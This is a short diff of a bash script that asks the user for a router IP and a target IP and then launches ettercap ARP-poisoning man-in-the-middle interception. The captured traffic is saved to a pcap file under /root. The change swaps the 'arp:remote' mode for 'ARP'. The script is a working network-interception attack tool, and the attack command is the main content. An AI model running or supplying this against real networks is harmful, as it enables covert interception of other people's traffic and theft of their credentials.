@@ -10,5 +10,5 @@ echo Enter Target 1 IP
 read -p 'Router IP: ' routervar
 echo Enter Target 2 IP - if required
 read -p 'Target IP: ' targetvar
-ettercap -T -i $intervar -M arp:remote -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
+ettercap -T -i $intervar -M ARP -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
 
